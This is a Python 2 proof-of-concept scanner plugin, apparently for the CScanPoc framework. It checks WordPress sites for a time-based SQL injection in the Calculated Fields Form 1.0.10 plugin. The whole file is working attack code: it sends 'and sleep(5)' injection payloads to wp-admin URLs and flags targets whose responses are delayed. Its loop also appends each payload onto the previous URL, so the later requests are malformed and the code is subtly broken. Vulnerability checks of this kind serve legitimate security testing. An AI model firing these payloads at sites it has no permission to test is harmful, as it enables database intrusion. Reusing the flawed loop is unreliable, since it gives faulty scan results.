# coding: utf-8
import urllib2
import time
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0111' # 平台漏洞编号，留空
    name = 'WordPress Calculated Fields Form 1.0.10 SQL Injection' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-11'  # 漏洞公布时间
    desc = '''
    There are sql injection vulnerabilities in Calculated Fields Form Plugin
    which could allow the attacker to execute sql queries into database.
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/36230/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Calculated Fields Form 1.0.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '314eaa45-3d39-44cb-93cf-b24e8e4b689b' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target
            payloads = {'/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 and sleep(5)&name=InsertText',
                        '/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21 and sleep(5)',
                        '/wp-admin/options-general.php?page=cp_calculated_fields_form&d=3 and sleep(5)'
                        }
            for payload in payloads:
                verify_url += payload
                start_time = time.time()
                req = urllib2.Request(verify_url)
                res_content = urllib2.urlopen(req).read()
                if time.time() - start_time > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()